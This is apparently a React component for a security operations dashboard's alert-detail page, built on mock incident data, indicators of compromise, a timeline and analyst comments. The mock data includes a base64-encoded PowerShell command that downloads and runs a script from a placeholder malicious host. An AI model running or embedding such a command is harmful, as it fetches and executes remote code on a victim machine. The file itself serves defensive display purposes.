import React, { useState, useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { 
  Shield, ArrowLeft, AlertTriangle, User, Clock, Server, MessageSquare,
  Send, CheckCircle, XCircle, Activity, Eye, FileText, Download,
  Globe, Terminal, Hash, Calendar, MapPin
} from "lucide-react";

// Mock data generator (same as SOCDashboard)
const SEVERITY_CONFIG = {
  CRITICAL: { color: "#ff0844", icon: AlertTriangle, label: "Critical" },
  HIGH: { color: "#ff6b00", icon: AlertTriangle, label: "High" },
  MEDIUM: { color: "#ffaa00", icon: AlertTriangle, label: "Medium" },
  LOW: { color: "#00d9ff", icon: AlertTriangle, label: "Low" },
  INFO: { color: "#7a8599", icon: AlertTriangle, label: "Informational" }
};

const STATUS_CONFIG = {
  NEW: { color: "#ff0844", icon: AlertTriangle, label: "New" },
  ASSIGNED: { color: "#ffaa00", icon: User, label: "Assigned" },
  IN_PROGRESS: { color: "#00d9ff", icon: Activity, label: "In Progress" },
  RESOLVED: { color: "#00ff88", icon: CheckCircle, label: "Resolved" },
  CLOSED: { color: "#7a8599", icon: XCircle, label: "Closed" },
  ESCALATED: { color: "#ff00ff", icon: AlertTriangle, label: "Escalated" }
};

const MOCK_ANALYSTS = [
  { id: "analyst_001", name: "Sarah Chen", role: "Senior Analyst", avatar: "SC" },
  { id: "analyst_002", name: "Mike Rodriguez", role: "L2 Analyst", avatar: "MR" },
  { id: "analyst_003", name: "Emma Thompson", role: "L1 Analyst", avatar: "ET" }
];

export default function AlertDetail() {
  const navigate = useNavigate();
  const { alertId } = useParams();
  const [status, setStatus] = useState("IN_PROGRESS");
  const [assignedTo, setAssignedTo] = useState("analyst_001");
  const [newComment, setNewComment] = useState("");
  const [comments, setComments] = useState([
    {
      id: 1,
      author: "Sarah Chen",
      timestamp: new Date(Date.now() - 3600000).toISOString(),
      text: "Initial triage completed. Appears to be legitimate threat. Isolating affected host."
    },
    {
      id: 2,
      author: "Mike Rodriguez",
      timestamp: new Date(Date.now() - 1800000).toISOString(),
      text: "Confirmed malicious PowerShell execution. Command decoded - attempted credential dump. Host quarantined successfully."
    },
    {
      id: 3,
      author: "Sarah Chen",
      timestamp: new Date(Date.now() - 900000).toISOString(),
      text: "Running full forensics scan. No lateral movement detected at this time. User credentials have been reset."
    }
  ]);

  // Mock alert data
  const alert = {
    id: alertId || "ALERT-000123",
    title: "Suspicious PowerShell Execution Detected",
    severity: "CRITICAL",
    category: "MALWARE",
    status: status,
    timestamp: new Date(Date.now() - 7200000).toISOString(),
    host: "WS-FINANCE-001",
    user: "john.doe",
    ip: "192.168.1.45",
    assigned_to: assignedTo,
    description: "Defender XDR detected suspicious PowerShell execution attempting to dump credentials from memory. The process was spawned by a user-initiated application and exhibited behavior consistent with known credential dumping tools.",
    ioc: {
      process: "powershell.exe",
      commandline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
      parent_process: "explorer.exe",
      file_hash: "a1b2c3d4e5f67890abcdef1234567890",
      file_path: "C:\\Users\\john.doe\\AppData\\Local\\Temp\\update.exe",
      network_destination: "185.220.101.45:443",
      registry_modified: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    },
    timeline: [
      { time: "14:23:12", event: "Malicious file downloaded", severity: "HIGH" },
      { time: "14:23:45", event: "PowerShell spawned with encoded command", severity: "CRITICAL" },
      { time: "14:24:02", event: "Attempted LSASS memory access", severity: "CRITICAL" },
      { time: "14:24:15", event: "Defender XDR block triggered", severity: "INFO" },
      { time: "14:24:30", event: "Alert generated and escalated", severity: "INFO" }
    ]
  };

  const severityConfig = SEVERITY_CONFIG[alert.severity];
  const statusConfig = STATUS_CONFIG[alert.status];

  const addComment = () => {
    if (!newComment.trim()) return;
    const comment = {
      id: comments.length + 1,
      author: "You",
      timestamp: new Date().toISOString(),
      text: newComment
    };
    setComments([...comments, comment]);
    setNewComment("");
  };

  return (
    <div style={{
      width: "100vw",
      height: "100vh",
      background: "#050810",
      color: "#e0e6f0",
      fontFamily: "monospace",
      overflow: "hidden",
      display: "flex",
      flexDirection: "column"
    }}>
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #0a0e1a; }
        ::-webkit-scrollbar-thumb { background: #1a2332; border-radius: 4px; }
        ::selection { background: #00d9ff; color: #000; }
      `}</style>



      {/* Main Content */}
      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
        {/* Left Panel - Details */}
        <div style={{
          flex: 2,
          overflowY: "auto",
          padding: "24px",
          display: "flex",
          flexDirection: "column",
          gap: "20px"
        }}>
          {/* Title & Description */}
          <div>
            <h1 style={{ fontSize: "18px", fontWeight: 600, marginBottom: "12px", color: "#e0e6f0" }}>
              {alert.title}
            </h1>
            <p style={{ fontSize: "12px", color: "#7a8599", lineHeight: 1.6 }}>
              {alert.description}
            </p>
          </div>

          {/* Quick Actions */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Quick Actions
            </h3>
            <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
              {Object.entries(STATUS_CONFIG).map(([key, config]) => (
                <button
                  key={key}
                  onClick={() => setStatus(key)}
                  style={{
                    padding: "8px 14px",
                    background: status === key ? `${config.color}20` : "#050810",
                    border: `1px solid ${status === key ? config.color : "#1a2332"}`,
                    borderRadius: "4px",
                    color: status === key ? config.color : "#7a8599",
                    fontSize: "11px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: "6px",
                    fontWeight: status === key ? 600 : 400
                  }}
                >
                  <config.icon size={12} />
                  {config.label}
                </button>
              ))}
            </div>
          </div>

          {/* Alert Information */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Alert Information
            </h3>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: "12px", fontSize: "11px" }}>
              {[
                { icon: Calendar, label: "Detected", value: new Date(alert.timestamp).toLocaleString() },
                { icon: Server, label: "Host", value: alert.host },
                { icon: User, label: "User", value: alert.user },
                { icon: Globe, label: "Source IP", value: alert.ip },
                { icon: Clock, label: "Time Elapsed", value: "2 hours 15 minutes" },
                { icon: Eye, label: "Status", value: statusConfig.label }
              ].map((item, i) => (
                <div key={i} style={{
                  background: "#050810",
                  border: "1px solid #1a2332",
                  borderRadius: "4px",
                  padding: "10px",
                  display: "flex",
                  alignItems: "start",
                  gap: "10px"
                }}>
                  <item.icon size={14} style={{ color: "#7a8599", marginTop: "2px" }} />
                  <div>
                    <div style={{ color: "#7a8599", fontSize: "9px", marginBottom: "4px" }}>{item.label}</div>
                    <div style={{ color: "#e0e6f0", fontWeight: 600 }}>{item.value}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* IOC Details */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Indicators of Compromise (IOC)
            </h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "10px", fontSize: "11px" }}>
              {[
                { label: "Process Name", value: alert.ioc.process, icon: Terminal },
                { label: "Parent Process", value: alert.ioc.parent_process, icon: Terminal },
                { label: "File Hash (SHA256)", value: alert.ioc.file_hash, icon: Hash },
                { label: "File Path", value: alert.ioc.file_path, icon: FileText },
                { label: "Network Connection", value: alert.ioc.network_destination, icon: Globe },
                { label: "Registry Modified", value: alert.ioc.registry_modified, icon: FileText }
              ].map((item, i) => (
                <div key={i} style={{
                  background: "#050810",
                  border: "1px solid #1a2332",
                  borderRadius: "4px",
                  padding: "10px"
                }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "4px" }}>
                    <item.icon size={12} style={{ color: "#7a8599" }} />
                    <span style={{ color: "#7a8599", fontSize: "9px" }}>{item.label}</span>
                  </div>
                  <code style={{ 
                    color: "#00d9ff", 
                    fontSize: "10px", 
                    fontFamily: "monospace",
                    wordBreak: "break-all",
                    display: "block"
                  }}>
                    {item.value}
                  </code>
                </div>
              ))}
            </div>
          </div>

          {/* Attack Timeline */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Attack Timeline
            </h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
              {alert.timeline.map((event, i) => {
                const color = event.severity === "CRITICAL" ? "#ff0844" : event.severity === "HIGH" ? "#ff6b00" : "#7a8599";
                return (
                  <div key={i} style={{
                    display: "flex",
                    gap: "12px",
                    alignItems: "start"
                  }}>
                    <div style={{
                      minWidth: "60px",
                      fontSize: "10px",
                      color: "#7a8599",
                      fontFamily: "monospace"
                    }}>
                      {event.time}
                    </div>
                    <div style={{
                      width: "3px",
                      height: "100%",
                      background: color,
                      borderRadius: "2px",
                      minHeight: "20px"
                    }} />
                    <div style={{ flex: 1 }}>
                      <div style={{ fontSize: "11px", color: "#e0e6f0" }}>{event.event}</div>
                      <div style={{ fontSize: "9px", color, marginTop: "2px" }}>{event.severity}</div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        {/* Right Panel - Comments & Assignment */}
        <div style={{
          flex: 1,
          borderLeft: "1px solid #1a2332",
          background: "#0a0e1a",
          display: "flex",
          flexDirection: "column",
          overflow: "hidden"
        }}>
          {/* Assignment */}
          <div style={{ padding: "16px", borderBottom: "1px solid #1a2332" }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "10px", color: "#00d9ff", textTransform: "uppercase" }}>
              Assigned To
            </h3>
            <select
              value={assignedTo}
              onChange={(e) => setAssignedTo(e.target.value)}
              style={{
                width: "100%",
                padding: "10px",
                background: "#050810",
                border: "1px solid #1a2332",
                borderRadius: "4px",
                color: "#e0e6f0",
                fontSize: "11px"
              }}
            >
              {MOCK_ANALYSTS.map(analyst => (
                <option key={analyst.id} value={analyst.id}>
                  {analyst.name} - {analyst.role}
                </option>
              ))}
            </select>
          </div>

          {/* Comments */}
          <div style={{ flex: 1, overflowY: "auto", padding: "16px" }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Investigation Log ({comments.length})
            </h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
              {comments.map(comment => (
                <div key={comment.id} style={{
                  background: "#050810",
                  border: "1px solid #1a2332",
                  borderRadius: "4px",
                  padding: "12px"
                }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "6px" }}>
                    <span style={{ fontSize: "11px", fontWeight: 600, color: "#00d9ff" }}>
                      {comment.author}
                    </span>
                    <span style={{ fontSize: "9px", color: "#7a8599" }}>
                      {new Date(comment.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <p style={{ fontSize: "11px", color: "#e0e6f0", lineHeight: 1.5 }}>
                    {comment.text}
                  </p>
                </div>
              ))}
            </div>
          </div>

          {/* Add Comment */}
          <div style={{ padding: "16px", borderTop: "1px solid #1a2332" }}>
            <textarea
              placeholder="Add investigation notes..."
              value={newComment}
              onChange={(e) => setNewComment(e.target.value)}
              rows={3}
              style={{
                width: "100%",
                padding: "10px",
                background: "#050810",
                border: "1px solid #1a2332",
                borderRadius: "4px",
                color: "#e0e6f0",
                fontSize: "11px",
                resize: "none",
                marginBottom: "8px",
                fontFamily: "monospace"
              }}
            />
            <button
              onClick={addComment}
              style={{
                width: "100%",
                padding: "10px",
                background: "#00d9ff",
                border: "none",
                borderRadius: "4px",
                color: "#000",
                fontSize: "11px",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px"
              }}
            >
              <Send size={12} />
              Add Comment
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
